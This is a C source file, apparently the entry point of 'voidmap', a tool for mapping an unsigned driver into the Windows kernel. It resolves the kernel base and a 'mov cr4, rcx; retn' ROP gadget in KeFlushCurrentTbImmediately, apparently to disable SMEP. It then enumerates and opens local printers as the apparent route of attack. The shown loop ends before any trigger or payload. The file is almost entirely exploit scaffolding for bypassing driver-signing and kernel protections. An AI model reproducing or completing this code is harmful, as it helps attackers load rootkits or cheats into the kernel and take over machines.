#include "general.h"

int main(int argc, char* argv[])
{
    ConsoleTitle("voidmap");

    if (argc != 2)
    {
        ConsoleError("Invalid parameters; read README in official repo (github.com/SamuelTulach/voidmap)");
        return -1;
    }

    ConsoleInfo("Reading driver file...");
    const char* driverFilePath = argv[1];
    SIZE_T driverFileSize;
    PVOID driverBuffer = UtilsReadFile(driverFilePath, &driverFileSize);
    if (!driverBuffer)
    {
        ConsoleError("Failed to read driver file!");
        return -1;
    }

    PIMAGE_NT_HEADERS64 imageHeaders = UtilsGetImageHeaders(driverBuffer, driverFileSize);
    if (!imageHeaders)
    {
        ConsoleError("Invalid image file!");
        return -1;
    }

    ConsoleSuccess("Driver timestamp: %llu", imageHeaders->FileHeader.TimeDateStamp);

    ConsoleInfo("Getting kernel base...");
    PVOID kernelBase = UtilsGetModuleBase("ntoskrnl.exe");
    if (!kernelBase)
    {
        ConsoleError("Could not get kernel base address!");
        return -1;
    }

    ConsoleSuccess("Kernel base: 0x%p", kernelBase);

    ConsoleInfo("Loading kernel image locally...");
    HMODULE kernelHandle = LoadLibraryExA("ntoskrnl.exe", NULL, DONT_RESOLVE_DLL_REFERENCES);
    if (!kernelHandle)
    {
        ConsoleError("Failed to load kernel image locally!");
        return -1;
    }

    ConsoleSuccess("Local base: 0x%p", kernelHandle);

    ConsoleInfo("Resolving KeFlushCurrentTbImmediately...");
    DWORD64 gadget = (DWORD64)GetProcAddress(kernelHandle, "KeFlushCurrentTbImmediately");
    if (!gadget)
    {
        ConsoleError("Failed to load kernel image locally!");
        return -1;
    }

    ConsoleSuccess("KeFlushCurrentTbImmediately: 0x%p", gadget);

    ConsoleInfo("Resolving gadget address...");
    //
    // KeFlushCurrentTbImmediately + 0x17
    // mov     cr4, rcx
    // retn
    //
    gadget += 0x17;

    DWORD64 gadgetKernelAddress = (DWORD64)kernelBase + gadget - (DWORD64)kernelHandle;
    ConsoleSuccess("Gadget: 0x%p", gadgetKernelAddress);

    ConsoleInfo("Finding printers...");
    DWORD pcbNeeded;
    DWORD pcbReturned;
    EnumPrintersA(PRINTER_ENUM_LOCAL, NULL, 4, NULL, 0, &pcbNeeded, &pcbReturned);
    if (pcbNeeded <= 0)
    {
        ConsoleError("Failed to find any printers!");
        return -1;
    }

    PRINTER_INFO_4A* printerEnum = malloc(pcbNeeded);
    if (!printerEnum)
    {
        ConsoleError("Failed allocate buffer from printer enumeration!");
        return -1;
    }

    BOOL status = EnumPrintersA(PRINTER_ENUM_LOCAL, NULL, 4, (LPBYTE)printerEnum, pcbNeeded, &pcbNeeded, &pcbReturned);
    if (!status || pcbReturned <= 0)
    {
        ConsoleError("Failed to enumerate printers!");
        return -1;
    }

    ConsoleSuccess("Printer info count: %llu", pcbReturned);

    for (DWORD i = 0; i < pcbReturned; i++)
    {
        PRINTER_INFO_4A* currentPrinter = &printerEnum[i];

        ConsoleInfo("Opening printer %s...", currentPrinter->pPrinterName);
        HANDLE printerHandle;
        status = OpenPrinterA(currentPrinter->pPrinterName, &printerHandle, NULL);
        if (!status)
        {
            ConsoleError("Failed to open printer!");
            continue;
        }

        ConsoleSuccess("Printer handle: 0x%p", printerHandle);


    }
}